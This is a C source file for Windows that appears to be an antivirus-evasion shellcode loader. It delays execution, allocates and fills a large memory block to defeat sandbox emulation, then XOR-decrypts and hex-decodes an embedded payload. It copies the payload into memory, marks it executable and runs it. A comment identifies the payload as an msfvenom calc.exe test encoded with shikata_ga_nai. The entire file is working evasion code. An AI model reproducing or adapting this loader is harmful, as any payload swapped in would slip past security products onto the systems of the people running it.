#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include "shellcodefuncs.h"

#define memBomb 150000000
#define MAGIC_BYTE_A 0xf1

int main() {

    Sleep(7500);
    BYTE *junk_mem = (BYTE *)malloc(memBomb);

    if (junk_mem){

        // msfvenom -p "windows/exec" CMD=calc.exe -e "x86/shikata_ga_nai" --smallest --platform windows -a "x86" -b "\x00" -i 0 -f c
        // in order to test -> make -j$(nproc) i686

        unsigned char encrypted_txt[1545] = {0174, 0111, 0141, 0105, 0123, 0113, 0134, 0124, 0172, 0125, 0110, 0155, 0111, 0146, 0123, 0103, 0102, 0120, 0102, 0153, 0125, 0114, 0175, 0131, 0143, 0121, 0133, 0122, 0125, 0100, 0163, 0105, 0111, 0171, 0101, 0163, 0125, 0127, 0112, 0105, 0104, 0177, 0135, 0131, 0175, 0115, 0153, 0105, 0123, 0107, 0121, 0124, 0173, 0121, 0101, 0155, 0111, 0146, 0123, 0103, 0102, 0120, 0103, 0153, 0124, 0111, 0174, 0131, 0143, 0120, 0120, 0122, 0125, 0101, 0172, 0105, 0111, 0171, 0100, 0163, 0125, 0132, 0113, 0105, 0104, 0177, 0135, 0131, 0175, 0114, 0147, 0105, 0123, 0107, 0127, 0124, 0173, 0120, 0117, 0155, 0111, 0152, 0135, 0103, 0102, 0120, 0107, 0153, 0125, 0115, 0165, 0131, 0143, 0120, 0122, 0122, 0125, 0100, 0163, 0105, 0111, 0170, 0117, 0163, 0125, 0132, 0112, 0105, 0104, 0176, 0126, 0131, 0175, 0114, 0143, 0105, 0123, 0106, 0135, 0124, 0173, 0134, 0100, 0155, 0111, 0146, 0123, 0103, 0102, 0134, 0114, 0153, 0125, 0114, 0176, 0131, 0143, 0120, 0123, 0122, 0125, 0100, 0162, 0105, 0111, 0170, 0113, 0163, 0125, 0126, 0104, 0105, 0104, 0162, 0135, 0131, 0175, 0114, 0146, 0105, 0123, 0107, 0125, 0124, 0173, 0120, 0111, 0155, 0111, 0146, 0123, 0103, 0102, 0121, 0114, 0153, 0124, 0111, 0177, 0131, 0143, 0134, 0133, 0122, 0125, 0101, 0176, 0105, 0111, 0170, 0113, 0163, 0125, 0132, 0105, 0105, 0104, 0176, 0125, 0131, 0175, 0114, 0147, 0105, 0123, 0107, 0124, 0124, 0173, 0121, 0100, 0155, 0110, 0143, 0127, 0103, 0103, 0125, 0106, 0153, 0125, 0100, 0172, 0131, 0143, 0134, 0132, 0122, 0125, 0101, 0172, 0105, 0111, 0164, 0100, 0163, 0125, 0126, 0106, 0105, 0104, 0177, 0134, 0131, 0175, 0114, 0146, 0105, 0123, 0113, 0134, 0124, 0173, 0121, 0101, 0155, 0111, 0146, 0125, 0103, 0102, 0120, 0104, 0153, 0125, 0100, 0164, 0131, 0143, 0120, 0123, 0122, 0125, 0100, 0163, 0105, 0111, 0164, 0100, 0163, 0125, 0127, 0113, 0105, 0104, 0162, 0134, 0131, 0174, 0111, 0141, 0105, 0123, 0106, 0135, 0124, 0172, 0125, 0111, 0155, 0111, 0147, 0135, 0103, 0102, 0121, 0115, 0153, 0125, 0100, 0164, 0131, 0143, 0120, 0126, 0122, 0124, 0104, 0172, 0105, 0111, 0170, 0111, 0163, 0124, 0123, 0100, 0105, 0104, 0176, 0125, 0131, 0175, 0114, 0140, 0105, 0123, 0107, 0125, 0124, 0173, 0120, 0112, 0155, 0111, 0146, 0120, 0103, 0102, 0120, 0102, 0153, 0125, 0100, 0165, 0131, 0143, 0120, 0120, 0122, 0125, 0101, 0173, 0105, 0111, 0171, 0100, 0163, 0125, 0127, 0112, 0105, 0104, 0176, 0123, 0131, 0175, 0100, 0153, 0105, 0123, 0107, 0127, 0124, 0173, 0134, 0116, 0155, 0111, 0146, 0124, 0103, 0102, 0134, 0115, 0153, 0125, 0114, 0173, 0131, 0143, 0134, 0133, 0122, 0125, 0101, 0171, 0105, 0111, 0164, 0100, 0163, 0125, 0127, 0113, 0105, 0104, 0177, 0134, 0131, 0175, 0114, 0146, 0105, 0123, 0107, 0123, 0124, 0172, 0125, 0110, 0155, 0111, 0146, 0124, 0103, 0102, 0120, 0106, 0153, 0125, 0114, 0173, 0131, 0143, 0121, 0133, 0122, 0125, 0100, 0162, 0105, 0110, 0175, 0111, 0163, 0125, 0127, 0113, 0105, 0104, 0176, 0126, 0131, 0175, 0115, 0152, 0105, 0123, 0107, 0123, 0124, 0173, 0134, 0101, 0155, 0111, 0146, 0126, 0103, 0102, 0120, 0103, 0153, 0125, 0114, 0175, 0131, 0143, 0121, 0133, 0122, 0125, 0100, 0163, 0105, 0111, 0171, 0100, 0163, 0124, 0123, 0102, 0105, 0104, 0176, 0124, 0131, 0175, 0114, 0145, 0105, 0123, 0113, 0135, 0124, 0173, 0120, 0113, 0155, 0111, 0146, 0122, 0103, 0102, 0121, 0115, 0153, 0125, 0114, 0173, 0131, 0142, 0125, 0122, 0122, 0125, 0101, 0172, 0105, 0111, 0170, 0110, 0163, 0125, 0132, 0105, 0105, 0104, 0176, 0127, 0131, 0175, 0114, 0144, 0105, 0123, 0107, 0123, 0124, 0173, 0134, 0101, 0155, 0111, 0146, 0124, 0103, 0102, 0120, 0106, 0153, 0125, 0114, 0173, 0131, 0143, 0134, 0133, 0122, 0125, 0100, 0163, 0105, 0111, 0171, 0100, 0163, 0124, 0123, 0102, 0105, 0104, 
        0176, 0121, 0131, 0175, 0114, 0142, 0105, 0123, 0106, 0134, 0124, 0172, 0125, 0113, 0155, 0110, 0143, 0127, 0103, 0102, 0134, 0103, 0153, 0125, 0100, 0164, 0131, 0143, 0134, 0132, 0122, 0125, 0100, 0162, 0105, 0111, 0164, 0100, 0163, 0124, 0123, 0100, 0105, 0104, 0177, 0135, 0131, 0174, 0111, 0143, 0105, 0123, 0106, 0135, 0124, 0173, 0121, 0100, 0155, 0111, 0152, 0134, 0103, 0102, 0120, 0101, 0153, 0125, 0114, 0174, 0131, 0143, 0120, 0125, 0122, 0124, 0104, 0172, 0105, 0111, 0171, 0101, 0163, 0125, 0126, 0107, 0105, 0104, 0176, 0126, 0131, 0174, 0111, 0141, 0105, 0123, 0107, 0121, 0124, 0173, 0121, 0101, 0155, 0111, 0146, 0124, 0103, 0102, 0120, 0101, 0153, 0124, 0111, 0175, 0131, 0142, 0125, 0121, 0122, 0125, 0101, 0175, 0105, 0111, 0170, 0110, 0163, 0125, 0132, 0112, 0105, 0104, 0176, 0120, 0131, 0174, 0111, 0143, 0105, 0123, 0107, 0125, 0124, 0173, 0120, 0113, 0155, 0111, 0146, 0120, 0103, 0102, 0120, 0107, 0153, 0124, 0111, 0174, 0131, 0143, 0120, 0121, 0122, 0125, 0101, 0170, 0105, 0111, 0170, 0117, 0163, 0125, 0126, 0104, 0105, 0104, 0162, 0135, 0131, 0175, 0114, 0140, 0105, 0123, 0107, 0123, 0124, 0173, 0120, 0111, 0155, 0111, 0146, 0127, 0103, 0102, 0121, 0114, 0153, 0125, 0115, 0164, 0131, 0142, 0125, 0123, 0122, 0125, 0101, 0172, 0105, 0111, 0170, 0115, 0163, 0125, 0126, 0106, 0105, 0104, 0176, 0123, 0131, 0175, 0100, 0153, 0105, 0123, 0106, 0135, 0124, 0173, 0134, 0100, 0155, 0111, 0146, 0127, 0103, 0102, 0134, 0114, 0153, 0125, 0114, 0173, 0131, 0143, 0134, 0133, 0122, 0125, 0101, 0170, 0105, 0111, 0170, 0117, 0163, 0125, 0127, 0113, 0105, 0104, 0162, 0134, 0131, 0175, 0115, 0153, 0105, 0123, 0106, 0134, 0124, 0172, 0125, 0111, 0155, 0111, 0146, 0124, 0103, 0102, 0120, 0102, 0153, 0125, 0100, 0165, 0131, 0143, 0121, 0133, 0122, 0125, 0101, 0171, 0105, 0111, 0170, 0117, 0163, 0125, 0132, 0112, 0105, 0104, 0177, 0135, 0131, 0175, 0115, 0152, 0105, 0122, 0102, 0125, 0124, 0173, 0121, 0101, 0155, 0111, 0146, 0123, 0103, 0102, 0120, 0103, 0153, 0125, 0114, 0177, 0131, 0143, 0120, 0121, 0122, 0125, 0101, 0173, 0105, 0111, 0170, 0113, 0163, 0125, 0126, 0102, 0105, 0104, 0176, 0127, 0131, 0175, 0114, 0140, 0105, 0123, 0113, 0135, 0124, 0173, 0120, 0112, 0155, 0111, 0152, 0135, 0103, 0102, 0120, 0100, 0153, 0125, 0115, 0164, 0131, 0143, 0120, 0120, 0122, 0125, 0101, 0174, 0105, 0111, 0170, 0112, 0163, 0125, 0132, 0105, 0105, 0104, 0176, 0126, 0131, 0175, 0115, 0152, 0105, 0122, 0102, 0127, 0124, 0172, 0125, 0113, 0155, 0110, 0143, 0124, 0103, 0102, 0121, 0114, 0153, 0125, 0114, 0176, 0131, 0142, 0125, 0121, 0122, 0125, 0101, 0170, 0105, 0110, 0175, 0113, 0163, 0125, 0126, 0101, 0105, 0104, 0162, 0122, 0131, 0175, 0114, 0145, 0105, 0123, 0113, 0135, 0124, 0173, 0121, 0100, 0155, 0111, 0146, 0125, 0103, 0103, 0125, 0105, 0153, 0125, 0100, 0165, 0131, 0143, 0120, 0125, 0122, 0124, 0104, 0173, 0105, 0111, 0170, 0112, 0163, 0124, 0123, 0102, 0105, 0104, 0176, 0121, 0131, 0175, 0100, 0144, 0105, 0123, 0106, 0135, 0124, 0173, 0121, 0100, 0155, 0111, 0146, 0123, 0103, 0103, 0125, 0104, 0153, 0125, 0114, 0173, 0131, 0143, 0120, 0120, 0122, 0125, 0115, 0163, 0105, 0111, 0170, 0111, 0163, 0125, 0127, 0112, 0105, 0104, 0177, 0135, 0131, 0175, 0115, 0153, 0105, 0123, 0106, 0135, 0124, 0173, 0121, 0101, 0155, 0111, 0147, 0135, 0103, 0102, 0120, 0107, 0153, 0125, 0115, 0165, 0131, 0143, 0120, 0127, 0122, 0125, 0101, 0175, 0105, 0111, 0170, 0110, 0163, 0125, 0127, 0113, 0105, 0104, 0176, 0123, 0131, 0175, 0100, 0153, 0105, 0123, 0107, 0121, 0124, 0172, 0125, 0113, 0155, 0111, 0146, 0123, 0103, 0102, 0120, 0101, 0153, 0124, 0111, 0177, 0131, 0142, 0125, 0121, 0122, 0124, 0104, 0173, 0105, 0111, 0170, 0112, 0163, 0125, 0132, 0112, 0105, 0104, 0162, 0135, 0131, 
        0174, 0111, 0141, 0105, 0123, 0106, 0135, 0124, 0173, 0134, 0101, 0155, 0111, 0146, 0126, 0103, 0102, 0134, 0103, 0153, 0125, 0114, 0175, 0131, 0143, 0120, 0120, 0122, 0125, 0101, 0177, 0105, 0111, 0170, 0115, 0163, 0125, 0126, 0104, 0105, 0104, 0162, 0122, 0131, 0175, 0114, 0147, 0105, 0123, 0107, 0122, 0124, 0173, 0120, 0112, 0155, 0111, 0152, 0135, 0103, 0103, 0125, 0104, 0153, 0125, 0114, 0172, 0131, 0142, 0125, 0123, 0122, 0124, 0104, 0171, 0105, 0110, 0175, 0113, 0163, 0124, 0123, 0102, 0105, 0104, 0176, 0126, 0131, 0175, 0114, 0142, 0105, 0123, 0113, 0134, 0124, 0173, 0121, 0101, 0155, 0111, 0146, 0121, 0103, 0102, 0120, 0101, 0153, 0125, 0100, 0164, 0131, 0143, 0121, 0133, 0122, 0125, 0115, 0174, 0105, 0111, 0170, 0117, 0163, 0125, 0127, 0112, 0105, 0105, 0173, 0127, 0131, 0175, 0100, 0153, 0105, 0122, 0102, 0124, 0124, 0173, 0121, 0101, 0155, 0111, 0146, 0120, 0103, 0102, 0120, 0107, 0153, 0125, 0115, 0165, 0131, 0143, 0120, 0120, 0122, 0125, 0115, 0163, 0105, 0111, 0164, 0101, 0163, 0125, 0126, 0100, 0105, 0104, 0176, 0120, 0131, 0175, 0115, 0152, 0105, 0123, 0107, 0124, 0124, 0173, 0120, 0114, 0155, 0111, 0146, 0125, 0103, 0102, 0120, 0100, 0153, 0124, 0111, 0177, 0131, 0143, 0120, 0127, 0122, 0125, 0115, 0174, 0105, 0111, 0171, 0101, 0163, 0125, 0127, 0112, 0105, 0104, 0176, 0126, 0131, 0175, 0114, 0142, 0105, 0122, 0102, 0127, 0124, 0172, 0125, 0113, 0155, 0110, 0143, 0125, 0103, 0102, 0120, 0107, 0153, 0125, 0114, 0171, 0131, 0143, 0120, 0122, 0122, 0125, 0101, 0177, 0105, 0111, 0171, 0100, 0163, 0125, 0126, 0106, 0105, 0104, 0162, 0134, 0131, 0175, 0114, 0147, 0105, 0123, 0107, 0124, 0124, 0173, 0120, 0111, 0155, 0110, 0143, 0124, 0103, 0102, 0120, 0100, 0153, 0125, 0114, 0176, 0131, 0143, 0120, 0126, 0122, 0125, 0101, 0175, 0105, 0111, 0170, 0115, 0163, 0125, 0126, 0101, 0105, 0104, 0177, 0135, 0131, 0175, 0115, 0153, 0105, 0000};
        
        char xor_key[] = "MySecretKey";
        
        memset(junk_mem, MAGIC_BYTE_A, memBomb);
        free(junk_mem);
        
        xor_decrypt(encrypted_txt, xor_key);
        
        unsigned char *shellcode = ascii_decode((const char *)encrypted_txt);
        unsigned int shellcode_size = strlen((const char*)shellcode);
        unsigned int memory_allocation = shellcode_size / 2;
        unsigned int char_in_hex;

        for(unsigned int i = 0; i< shellcode_size-1; i++) {
    
            sscanf((const char *)shellcode+2*i, "%2X", &char_in_hex);
            shellcode[i] = (char)char_in_hex;
    
        }

        void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        memcpy(exec, shellcode, memory_allocation);
        free(shellcode);

        DWORD ignore;
        VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
        (*(void (*)()) exec)();
    
    }
    
    return 0;

}